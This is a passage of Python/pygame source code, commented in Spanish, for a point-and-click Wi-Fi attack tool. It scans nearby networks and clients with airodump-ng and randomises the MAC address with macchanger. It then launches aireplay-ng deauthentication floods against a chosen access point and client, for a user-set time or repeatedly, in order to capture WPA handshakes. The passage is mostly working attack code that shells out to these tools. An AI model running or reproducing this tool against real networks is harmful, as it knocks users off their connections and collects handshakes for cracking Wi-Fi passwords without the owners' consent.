									deviter = fuente.render(f'{value}', True, white)
									deviterrect = deviter.get_rect()
									deviterrect.x = screenwidth//2-deviterrect.width//2
									deviterrect.y = int(key)
									if deviterrect.collidepoint(mousepos):
										deviter = fuente.render(f'{value}', True, red)
									else:
										pass
									screen.blit(deviter, (deviterrect.x, deviterrect.y))
								screen.blit(blackout, (0, 0))
								pygame.display.flip()
								clock.tick(60)
							break
							
			elif userinDEOUIN3:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					mindataheight = 100
					for data in finallines:
						beacondataline = fuentechica.render(f'{data}', True, white)
						beacondatalinerect = beacondataline.get_rect()
						beacondatalinerect.x = 10
						beacondatalinerect.y = mindataheight
						if beacondatalinerect.collidepoint(mousepos):
							beacondataline = fuentechica.render(f'{data}', True, red)
							data2 = data
							definitivebssid = data2[:17]
							definitivechannel = ""
							dc = data2[47:51]
							for char in dc:
								if char in string.digits:
									definitivechannel += f"{char}"
							
							os.system(f"sudo timeout --foreground 12s airodump-ng -c {definitivechannel} --bssid {definitivebssid} {finaldevice}mon > Data/.specNETWORK.txt")
							with open("Data/.NEARWIFIs.txt", "r") as devsfiles:
								linelist2 = devsfiles.readlines()
							for line in reversed(linelist2):
								if "Quitting..." in line: 
									startadding = True
									continue
					
								if "STATION            PWR   Rate " in line:
									break
											
								if startadding:
									if "[0K[1B " in line and "PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER" not in line:
										importantstationlines.append(line[9:-4])
									else:
										if line[0] != " ":
											importantstationlines.append(line[:-4])
										else:
											importantstationlines.append(line[1:-4])
						
							for line in reversed(importantstationlines):
								if len(line) > 10 and "(" not in line and ")" not in line:
									finalstationlines.append(line)
							
							
							userinDEOUIN3 = False
							userinDEOUIN4 = True
							#a negro
							transitiondone = False
							while blackoutalpha != 255:
								blackoutalpha += 5
								blackout.set_alpha(blackoutalpha)
								screen.fill(black)
								mindataheight = 100
								for data in finallines:
									beacondataline = fuentechica.render(f'{data}', True, white)
									beacondatalinerect = beacondataline.get_rect()
									beacondatalinerect.x = 10
									beacondatalinerect.y = mindataheight
									if beacondatalinerect.collidepoint(mousepos):
										beacondataline = fuentechica.render(f'{data}', True, red)
									else:
										pass
									screen.blit(beacondataline, (10, mindataheight))
									mindataheight += 50
								screen.blit(blackout, (0, 0))
								pygame.display.flip()
								clock.tick(60)
						else:
							pass
							
						mindataheight += 50
						
						
			elif userinDEOUIN4:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					firstdistance = 300
					for stationstring in finalstationlines:
						stationrender = fuentechica.render(f'{stationstring}', True, white)          		 
						stationrenderrect = enter.get_rect()							 
						stationrenderrect.x = 40
						stationrenderrect.y = firstdistance
						if stationrenderrect.collidepoint(mousepos):
							stationrender = fuentechica.render(f'{stationstring}', True, red)
							stationbssid = stationstring[19:36]
							userinDEOUIN4 = False
							userinDEOUIN5 = True
							
							transitiondone = False
							#a negro
							while blackoutalpha != 255:
								blackoutalpha += 5
								blackout.set_alpha(blackoutalpha)
								screen.fill(black)
								firstdistance = 300
								for stationstring in finalstationlines:
									stationrender = fuentechica.render(f'{stationstring}', True, white)          		 
									stationrenderrect = enter.get_rect()							 
									stationrenderrect.x = 40
									stationrenderrect.y = firstdistance
									if stationrenderrect.collidepoint(mousepos):
										stationrender = fuentechica.render(f'{stationstring}', True, red)
									else:
										pass  			 
									screen.blit(stationrender, (stationrenderrect.x, firstdistance))
									firstdistance += 50
								screen.blit(stationstxt, (stationstxtrect.x, stationstxtrect.y))
								screen.blit(blackout, (0, 0))
								pygame.display.flip()
								clock.tick(60)
							transitiondone = False
							
						else:
							pass  
						firstdistance += 50
			
			elif userinDEOUIN5:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					if timetxtbox.collidepoint(mousepos):
						pressedtimetxtbox = True
					else:
						pressedtimetxtbox = False
				elif event.type == pygame.KEYDOWN and pressedtimetxtbox:
					kbstate = pygame.key.get_pressed()
					if len(timerenderstring) < 6:
						if event.unicode in string.digits:
							timerenderstring += event.unicode
							
					if kbstate[pygame.K_BACKSPACE]:
						timerenderstring = timerenderstring[:-1]
						
					if kbstate[pygame.K_RETURN]:
						startingadv1= fuente.render(f'Starting attack for {timerenderstring}s', True, red)
						startingadv1rect = startingadv1.get_rect()
						startingadv1rect.x = screenwidth//2-startingadv1rect.width//2
						startingadv1rect.y = screenheight//2-startingadv1rect.height//2
						
						userinDEOUIN5 = False
						userinDEOUIN6 = True
						
						transitiondone = False
						#a negro
						while blackoutalpha != 255:
							blackoutalpha += 5
							blackout.set_alpha(blackoutalpha)
							screen.fill(black)
							screen.blit(attacktimedata, (attacktimedatarect.x, attacktimedatarect.y))
							screen.blit(tiemporender, (tiemporenderrect.x, tiemporenderrect.y))
							if not pressedtimetxtbox:
								pygame.draw.rect(screen, white, timetxtbox, 4)
							else:
								pygame.draw.rect(screen, red, timetxtbox, 4)
							screen.blit(blackout, (0, 0))
							pygame.display.flip()
							clock.tick(60)
						transitiondone = False
					
					tiemporender = fuentechica.render(timerenderstring, True, red) 
					tiemporenderrect = tiemporender.get_rect()							 
					tiemporenderrect.x = screenwidth//2-tiemporenderrect.width//2
					tiemporenderrect.y = screenheight//2-tiemporenderrect.height//2		 
						
		if userinDEOUIN1:		
			#transicion de negro a mostrar todo
			if not transitiondone:
				while blackoutalpha != 0:
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(enter, (enterrect.x, enterrect.y))
					screen.blit(enterdataDEOUIN, (enterdataDEOUINrect.x, enterdataDEOUINrect.y))
					#aca todo
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
			
			screen.fill(black)
			screen.blit(enter, (enterrect.x, enterrect.y))
			screen.blit(enterdataDEOUIN, (enterdataDEOUINrect.x, enterdataDEOUINrect.y))
			pygame.display.flip()
			clock.tick(60)
			
		elif userinDEOUIN2:
			mousepos = pygame.mouse.get_pos()
			#a color
			if not transitiondone:
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
					for key,value in fakevars.items():
						deviter = fuente.render(f'{value}', True, white)
						deviterrect = deviter.get_rect()
						deviterrect.x = screenwidth//2-deviterrect.width//2
						deviterrect.y = int(key)
						if deviterrect.collidepoint(mousepos):
							deviter = fuente.render(f'{value}', True, red)
						else:
							pass
						screen.blit(deviter, (deviterrect.x, deviterrect.y))
					#aca todo
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
				
			screen.fill(black)
			screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
			for key,value in fakevars.items():
				deviter = fuente.render(f'{value}', True, white)
				deviterrect = deviter.get_rect()
				deviterrect.x = screenwidth//2-deviterrect.width//2
				deviterrect.y = int(key)
				if deviterrect.collidepoint(mousepos):
					deviter = fuente.render(f'{value}', True, red)
				else:
					pass
				screen.blit(deviter, (deviterrect.x, deviterrect.y))
			pygame.display.flip()
			clock.tick(60)
		
		elif userinDEOUIN3:
			mousepos = pygame.mouse.get_pos()
			#transicion
			if not transitiondone:
				with open("Data/.NEARWIFIs.txt", "r") as devsfiles:
					linelist = devsfiles.readlines()
				for line in reversed(linelist):
					if "STATION" in line: 
						startadding = True
						continue
					
					if "PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER" in line:
						break
											
					if startadding:
						if "[0K[1B " in line and "PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER" not in line:
							importantlines.append(line[9:-4])
						else:
							if line[0] != " ":
								importantlines.append(line[:-4])
							else:
								importantlines.append(line[1:-4])
						
				for line in reversed(importantlines):
					finallines.append(line)
				
				mindataheight = 0
				
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					mindataheight = 100
					for data in finallines:
						beacondataline = fuentechica.render(f'{data}', True, white)
						beacondatalinerect = beacondataline.get_rect()
						beacondatalinerect.x = 10
						beacondatalinerect.y = mindataheight
						if beacondatalinerect.collidepoint(mousepos):
							beacondataline = fuentechica.render(f'{data}', True, red)
						else:
							pass
						screen.blit(beacondataline, (10, mindataheight))
						mindataheight += 50
						
						
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
				
			screen.fill(black)
			mindataheight = 100
			for data in finallines:
				beacondataline = fuentechica.render(f'{data}', True, white)
				beacondatalinerect = beacondataline.get_rect()
				beacondatalinerect.x = 10
				beacondatalinerect.y = mindataheight
				if beacondatalinerect.collidepoint(mousepos):
					beacondataline = fuentechica.render(f'{data}', True, red)
				else:
					pass
				screen.blit(beacondataline, (10, mindataheight))
				mindataheight += 50
						
						
			pygame.display.flip()
			clock.tick(60)
			
		elif userinDEOUIN4:
		#a color
			mousepos = pygame.mouse.get_pos()
			if not transitiondone:
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					#aca todo
					firstdistance = 300
					for stationstring in finalstationlines:
						stationrender = fuentechica.render(f'{stationstring}', True, white)          		 
						stationrenderrect = enter.get_rect()							 
						stationrenderrect.x = 40
						stationrenderrect.y = firstdistance
						if stationrenderrect.collidepoint(mousepos):
							stationrender = fuentechica.render(f'{stationstring}', True, red)
						else:
							pass  	 				 
						screen.blit(stationrender, (stationrenderrect.x, firstdistance))
						firstdistance += 50
					screen.blit(stationstxt, (stationstxtrect.x, stationstxtrect.y))
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
			
			screen.fill(black)
			firstdistance = 300
			for stationstring in finalstationlines:
				stationrender = fuentechica.render(f'{stationstring}', True, white)          		 
				stationrenderrect = enter.get_rect()							 
				stationrenderrect.x = 40
				stationrenderrect.y = firstdistance
				if stationrenderrect.collidepoint(mousepos):
					stationrender = fuentechica.render(f'{stationstring}', True, red)
				else:
					pass  			 
				screen.blit(stationrender, (stationrenderrect.x, firstdistance))
				firstdistance += 50
			screen.blit(stationstxt, (stationstxtrect.x, stationstxtrect.y))
			pygame.display.flip()
			clock.tick(60)
			
		elif userinDEOUIN5:
			if not transitiondone:
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(attacktimedata, (attacktimedatarect.x, attacktimedatarect.y))
					screen.blit(tiemporender, (tiemporenderrect.x, tiemporenderrect.y))
					pygame.draw.rect(screen, white, timetxtbox, 4)
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
				
			screen.fill(black)
			screen.blit(attacktimedata, (attacktimedatarect.x, attacktimedatarect.y))
			screen.blit(tiemporender, (tiemporenderrect.x, tiemporenderrect.y))
			pygame.draw.rect(screen, white, timetxtbox, 4)
			pygame.display.flip()
			clock.tick(60)
			
			
		elif userinDEOUIN6:
			if not transitiondone:
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(startingadv1, (startingadv1rect.x, startingadv1rect.y))
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
			
			screen.fill(black)
			screen.blit(startingadv1, (startingadv1rect.x, startingadv1rect.y))
			screen.blit(blackout, (0, 0))
			pygame.display.flip()
			clock.tick(60)
			os.system(f"sudo timeout --foreground {timerenderstring}s aireplay-ng -0 0 -a {definitivebssid} -c {stationbssid} {finaldevice}mon")
			os.system("clear")
			print(color.BOLD + color.GREEN + "Attack finished" + color.END)
			os.system(f"sudo airmon-ng stop {finaldevice}mon")
			sys.exit()
			
			
		else:
			print(color.RED + color.TIKTOK + "te olvidaste de meter algo aca DEOUIN jasjajs" + color.END)
			os.system(f"sudo airmon-ng stop {finaldevice}mon")
			pygame.QUIT
			sys.exit()
		
#----------------------------------------------------------WCWD-----------------------------------------------------------------------------------
		
	elif userinWCWD:
		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				running = False
				
			if userinWCWD1:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					for key,value in fakevars.items():
						deviter = fuente.render(f'{value}', True, white)
						deviterrect = deviter.get_rect()
						deviterrect.x = screenwidth//2-deviterrect.width//2
						deviterrect.y = int(key)
						if deviterrect.collidepoint(mousepos):
							#DECLARAMOS QUE INTERFAZ VOY A USAR
							finaldevice = f"{value}"
							os.system(f"sudo ifconfig {finaldevice} down")
							os.system(f"sudo macchanger -r {finaldevice}")
							os.system(f"sudo ifconfig {finaldevice} up")
							os.system(f"sudo airmon-ng start {finaldevice}")
							os.system("sudo pkill dhclient && pkill wpa_supplicant")
							os.system(f"sudo timeout --foreground 12s airodump-ng {finaldevice}mon > Data/.NEARWIFIs.txt")
							userinWCWD1 = False
							userinWCWD2 = True
							transitiondone = False
							while blackoutalpha != 255:
								blackoutalpha += 5
								blackout.set_alpha(blackoutalpha)
								screen.fill(black)
								screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
								for key,value in fakevars.items():
									deviter = fuente.render(f'{value}', True, white)
									deviterrect = deviter.get_rect()
									deviterrect.x = screenwidth//2-deviterrect.width//2
									deviterrect.y = int(key)
									if deviterrect.collidepoint(mousepos):
										deviter = fuente.render(f'{value}', True, red)
									else:
										pass
									screen.blit(deviter, (deviterrect.x, deviterrect.y))
								screen.blit(blackout, (0, 0))
								pygame.display.flip()
								clock.tick(60)
							break
							
			elif userinWCWD2:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					mindataheight = 100
					for data in finallines:
						beacondataline = fuentechica.render(f'{data}', True, white)
						beacondatalinerect = beacondataline.get_rect()
						beacondatalinerect.x = 10
						beacondatalinerect.y = mindataheight
						if beacondatalinerect.collidepoint(mousepos):
							beacondataline = fuentechica.render(f'{data}', True, red)
							data2 = data
							definitivebssid = data2[:17]
							definitivechannel = ""
							dc = data2[47:51]
							for char in dc:
								if char in string.digits:
									definitivechannel += f"{char}"
							
							os.system(f"sudo timeout --foreground 12s airodump-ng -c {definitivechannel} --bssid {definitivebssid} {finaldevice}mon > Data/.specNETWORK.txt")
							with open("Data/.NEARWIFIs.txt", "r") as devsfiles:
								linelist2 = devsfiles.readlines()
							for line in reversed(linelist2):
								if "Quitting..." in line: 
									startadding = True
									continue
					
								if "STATION            PWR   Rate " in line:
									break
											
								if startadding:
									if "[0K[1B " in line and "PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER" not in line:
										importantstationlines.append(line[9:-4])
									else:
										if line[0] != " ":
											importantstationlines.append(line[:-4])
										else:
											importantstationlines.append(line[1:-4])
						
							for line in reversed(importantstationlines):
								if len(line) > 10 and "(" not in line and ")" not in line:
									finalstationlines.append(line)
							
							
							userinWCWD2 = False
							userinWCWD3 = True
							#a negro
							transitiondone = False
							while blackoutalpha != 255:
								blackoutalpha += 5
								blackout.set_alpha(blackoutalpha)
								screen.fill(black)
								mindataheight = 100
								for data in finallines:
									beacondataline = fuentechica.render(f'{data}', True, white)
									beacondatalinerect = beacondataline.get_rect()
									beacondatalinerect.x = 10
									beacondatalinerect.y = mindataheight
									if beacondatalinerect.collidepoint(mousepos):
										beacondataline = fuentechica.render(f'{data}', True, red)
									else:
										pass
									screen.blit(beacondataline, (10, mindataheight))
									mindataheight += 50
								screen.blit(blackout, (0, 0))
								pygame.display.flip()
								clock.tick(60)
						else:
							pass
							
						mindataheight += 50
						
			elif userinWCWD3:
				if event.type == pygame.MOUSEBUTTONDOWN:
					mousepos = pygame.mouse.get_pos()
					firstdistance = 300
					for stationstring in finalstationlines:
						stationrender = fuentechica.render(f'{stationstring}', True, white)          		 
						stationrenderrect = enter.get_rect()							 
						stationrenderrect.x = 40
						stationrenderrect.y = firstdistance
						if stationrenderrect.collidepoint(mousepos):
							stationrender = fuentechica.render(f'{stationstring}', True, red)
							stationbssid = stationstring[19:36]
							os.system(f"gnome-terminal -- sudo airodump-ng -c {definitivechannel} --bssid {definitivebssid} -w .HandshakeDATA {finaldevice}mon")
							userinWCWD3 = False
							userinWCWD4 = True
							
							transitiondone = False
							#a negro
							while blackoutalpha != 255:
								blackoutalpha += 5
								blackout.set_alpha(blackoutalpha)
								screen.fill(black)
								firstdistance = 300
								for stationstring in finalstationlines:
									stationrender = fuentechica.render(f'{stationstring}', True, white)          		 
									stationrenderrect = enter.get_rect()							 
									stationrenderrect.x = 40
									stationrenderrect.y = firstdistance
									if stationrenderrect.collidepoint(mousepos):
										stationrender = fuentechica.render(f'{stationstring}', True, red)
									else:
										pass  			 
									screen.blit(stationrender, (stationrenderrect.x, firstdistance))
									firstdistance += 50
								screen.blit(stationstxt, (stationstxtrect.x, stationstxtrect.y))
								screen.blit(blackout, (0, 0))
								pygame.display.flip()
								clock.tick(60)
							transitiondone = False
							
						else:
							pass  
						firstdistance += 50
			
				
					
				#apretaciones arriba
				
		if userinWCWD1:
			mousepos = pygame.mouse.get_pos()
			#a color
			if not transitiondone:
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
					for key,value in fakevars.items():
						deviter = fuente.render(f'{value}', True, white)
						deviterrect = deviter.get_rect()
						deviterrect.x = screenwidth//2-deviterrect.width//2
						deviterrect.y = int(key)
						if deviterrect.collidepoint(mousepos):
							deviter = fuente.render(f'{value}', True, red)
						else:
							pass
						screen.blit(deviter, (deviterrect.x, deviterrect.y))
					#aca todo
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
				
			screen.fill(black)
			screen.blit(interfacesdata, (interfacesdatarect.x, interfacesdatarect.y))
			for key,value in fakevars.items():
				deviter = fuente.render(f'{value}', True, white)
				deviterrect = deviter.get_rect()
				deviterrect.x = screenwidth//2-deviterrect.width//2
				deviterrect.y = int(key)
				if deviterrect.collidepoint(mousepos):
					deviter = fuente.render(f'{value}', True, red)
				else:
					pass
				screen.blit(deviter, (deviterrect.x, deviterrect.y))
			pygame.display.flip()
			clock.tick(60)
		
		
		
		elif userinWCWD2:
			mousepos = pygame.mouse.get_pos()
			#transicion
			if not transitiondone:
				with open("Data/.NEARWIFIs.txt", "r") as devsfiles:
					linelist = devsfiles.readlines()
				for line in reversed(linelist):
					if "STATION" in line: 
						startadding = True
						continue
					
					if "PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER" in line:
						break
											
					if startadding:
						if "[0K[1B " in line and "PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER" not in line:
							importantlines.append(line[9:-4])
						else:
							if line[0] != " ":
								importantlines.append(line[:-4])
							else:
								importantlines.append(line[1:-4])
						
				for line in reversed(importantlines):
					finallines.append(line)
				
				mindataheight = 0
				
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					mindataheight = 100
					for data in finallines:
						beacondataline = fuentechica.render(f'{data}', True, white)
						beacondatalinerect = beacondataline.get_rect()
						beacondatalinerect.x = 10
						beacondatalinerect.y = mindataheight
						if beacondatalinerect.collidepoint(mousepos):
							beacondataline = fuentechica.render(f'{data}', True, red)
						else:
							pass
						screen.blit(beacondataline, (10, mindataheight))
						mindataheight += 50
						
						
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
				
			screen.fill(black)
			mindataheight = 100
			for data in finallines:
				beacondataline = fuentechica.render(f'{data}', True, white)
				beacondatalinerect = beacondataline.get_rect()
				beacondatalinerect.x = 10
				beacondatalinerect.y = mindataheight
				if beacondatalinerect.collidepoint(mousepos):
					beacondataline = fuentechica.render(f'{data}', True, red)
				else:
					pass
				screen.blit(beacondataline, (10, mindataheight))
				mindataheight += 50
						
						
			pygame.display.flip()
			clock.tick(60)
			
		
		elif userinWCWD3:
			#a color
			mousepos = pygame.mouse.get_pos()
			if not transitiondone:
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					#aca todo
					firstdistance = 300
					for stationstring in finalstationlines:
						stationrender = fuentechica.render(f'{stationstring}', True, white)          		 
						stationrenderrect = enter.get_rect()							 
						stationrenderrect.x = 40
						stationrenderrect.y = firstdistance
						if stationrenderrect.collidepoint(mousepos):
							stationrender = fuentechica.render(f'{stationstring}', True, red)
						else:
							pass  	 				 
						screen.blit(stationrender, (stationrenderrect.x, firstdistance))
						firstdistance += 50
					screen.blit(stationstxt, (stationstxtrect.x, stationstxtrect.y))
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
			
			screen.fill(black)
			firstdistance = 300
			for stationstring in finalstationlines:
				stationrender = fuentechica.render(f'{stationstring}', True, white)          		 
				stationrenderrect = enter.get_rect()							 
				stationrenderrect.x = 40
				stationrenderrect.y = firstdistance
				if stationrenderrect.collidepoint(mousepos):
					stationrender = fuentechica.render(f'{stationstring}', True, red)
				else:
					pass  			 
				screen.blit(stationrender, (stationrenderrect.x, firstdistance))
				firstdistance += 50
			screen.blit(stationstxt, (stationstxtrect.x, stationstxtrect.y))
			pygame.display.flip()
			clock.tick(60)
			
		elif userinWCWD4:
			fpscounting += 1
			if not transitiondone:
				while blackoutalpha != 0:
					mousepos = pygame.mouse.get_pos()
					for event in pygame.event.get():
						if event.type == pygame.QUIT:
							running = False
							break
					blackoutalpha -= 5
					blackout.set_alpha(blackoutalpha)
					screen.fill(black)
					#aca todo
					screen.bli(gethstxt, (gethstxtrect.x, gethstxtrect.y))
					screen.blit(blackout, (0, 0))
					pygame.display.flip()
					clock.tick(60)
				transitiondone = True
			
			screen.fill(black)
			screen.bli(gethstxt, (gethstxtrect.x, gethstxtrect.y))
			pygame.display.flip()
			clock.tick(60)
			if fpscounting >= 600:
				print("deauthing")
				with open("Data/IMPORTANTdata.py", "w+") as pyfile:
					pyfile.write(f"interfacename = '{finaldevice}' \nwifibssid = '{definitivebssid}' \nclientssid = '{stationbssid}'")

				os.system(f"sudo aireplay-ng -0 2 -a {definitivebssid} -c {stationbssid} {finaldevice}mon")

				fpscounting = 0
			
		else:
			print(color.RED + color.TIKTOK + "te olvidaste de meter algo aca WCWD jasjajs" + color.END)
			os.system(f"sudo airmon-ng stop {finaldevice}mon")
			pygame.QUIT
			sys.exit()

			
		
		
	else:
		print(color.RED + color.TIKTOK + "te olvidaste de meter algo aca jasjajs" + color.END)
		os.system(f"sudo airmon-ng stop {finaldevice}mon")
		pygame.QUIT
		sys.exit()


#esto si termina el loop
os.system(f"sudo airmon-ng stop {finaldevice}mon")
pygame.QUIT
sys.exit()
